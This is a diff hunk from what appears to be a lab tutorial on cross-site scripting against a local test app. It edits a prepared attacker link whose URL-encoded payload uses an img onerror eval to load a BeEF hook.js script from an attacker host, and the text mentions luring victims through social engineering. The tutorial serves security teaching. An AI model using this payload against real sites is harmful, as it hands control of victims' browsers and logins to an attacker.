@@ -71,7 +71,7 @@ victims to click on that link, for example by social engineering, using link
 shorteners and messaging the link.
 
 Click on the following link, prepared by the attacker:
-[http://vulnerable.local:3500/#/search?q=%3Cimg%20width=0%20height=0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple](<http://vulnerable.local:3500/#/search?q=%3Cimg%20width=0%20height=0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple>)
+[http://vulnerable.local:3500/#/search?q=%3Cimg%20width%3D0%20height%3D0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple](http://vulnerable.local:3500/#/search?q=%3Cimg%20width%3D0%20height%3D0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple)
 
 Nothing weird happens, right? You don't see results, but that's all. Say now
 that the victim wants to log on to the site, and clicks on the account link top
